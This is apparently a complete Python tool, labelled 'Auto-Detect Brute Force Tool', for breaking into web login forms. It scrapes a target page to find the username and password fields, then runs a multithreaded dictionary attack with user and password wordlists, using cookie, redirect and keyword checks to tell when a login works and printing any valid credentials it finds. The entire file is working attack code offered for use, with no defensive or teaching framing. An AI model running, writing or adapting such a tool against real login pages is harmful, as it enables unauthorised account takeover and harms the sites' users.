import threading
import requests
from lxml import html

# # Read lines from file
def open_resources(file_path):
    try:
        return [item.strip() for item in open(file_path).readlines()]
    except Exception as e:
        print(f"[!] Error reading file {file_path}: {e}")
        return



# Global flags
found_creds = False
lock = threading.Lock()


# Try login function
def try_login(session, url, user_field, password_field, user, password):
    global found_creds

    if found_creds:
        return

    payload = {
        user_field: user,
        password_field: password
    }

    try:
        response = session.post(url, data=payload, allow_redirects=True, timeout=10)

        # Success detection 1: Redirect + dashboard cookie
        if response.history and any('logged_in_' in c for c in response.cookies.get_dict()):
            handle_success(user, password)
            return

        # Success detection 2: Cookie header
        elif any('logged_in_' in c for c in response.headers.get('Set-Cookie', '')):
            handle_success(user, password)
            return

        # Success detection 3: Keyword match
        elif "dashboard" in response.text.lower():
            handle_success(user, password)
            return

        else:
            print(f"[-] Failed: {user} / {password}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")


# Handle successful login
def handle_success(user, password):
    global found_creds

    with lock:
        if found_creds:
            return

        print(f"\n[+] SUCCESS: Username: {user}, Password: {password}\n")
        found_creds = True


# Extract form fields automatically
def extract_form_fields(url):
    print(f"[+] Fetching form fields from {url}")
    try:
        response = requests.get(url, timeout=10)
        tree = html.fromstring(response.text)

        forms = tree.xpath("//form")
        if not forms:
            print("[!] No form found on page.")
            return None, None

        form = forms[0]
        inputs = form.xpath(".//input[@name and @type='text' or @type='password']")
        if len(inputs) < 2:
            print("[!] Not enough input fields found.")
            return None, None

        user_field = None
        pass_field = None

        for inp in inputs:
            name = inp.xpath("@name")[0].strip()
            iptype = inp.xpath("@type")[0].strip()

            if iptype == "text" and not user_field:
                user_field = name
            elif iptype == "password" and not pass_field:
                pass_field = name

        if user_field and pass_field:
            print(f"[+] Detected fields: Username => '{user_field}', Password => '{pass_field}'")
            return user_field, pass_field
        else:
            print("[!] Could not auto-detect both username and password fields.")
            return None, None

    except Exception as e:
        print(f"[!] Error extracting form fields: {e}")
        return None, None


# Start attack worker
def start_attack_worker(url, user_field, password_field, users_chunk, password_list):
    with requests.Session() as session:
        for user in users_chunk:
            for password in password_list:
                if found_creds:
                    return
                try_login(session, url, user_field, password_field, user, password)


# Main attack function
def start_attack(url, num_threads):
    global found_creds
    found_creds = False

    print(f"\n[+] Connecting to: {url}\n")

    # Step 1: Auto-detect form fields
    user_field, pass_field = extract_form_fields(url)
    if not user_field or not pass_field:
        print("[!] Couldn't auto-detect form fields. Exiting.")
        return

    # Step 2: Load wordlists
    users = open_resources(user_file)
    passwords = open_resources(pass_file)

    chunk_size = max(len(users) // num_threads, 1)
    threads = []

    for i in range(num_threads):
        start_index = i * chunk_size
        end_index = None if i + 1 == num_threads else start_index + chunk_size
        users_chunk = users[start_index:end_index]

        thread = threading.Thread(
            target=start_attack_worker,
            args=(url, user_field, pass_field, users_chunk, passwords)
        )
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if found_creds:
        print("[+] Attack completed. Valid credentials found.")
    else:
        print("[-] Attack completed. No valid credentials found.")


if __name__ == "__main__":

    print("\n=== Auto-Detect Brute Force Tool ===\n")

    target_url = input("Enter target URL (e.g., https://example.com/login.php): ").strip()
    user_file = input("Enter path to username list: ").strip()
    pass_file = input("Enter path to password list: ").strip()
    thread_count = int(input("Enter number of threads (e.g., 5): ").strip())

    start_attack(target_url, thread_count)

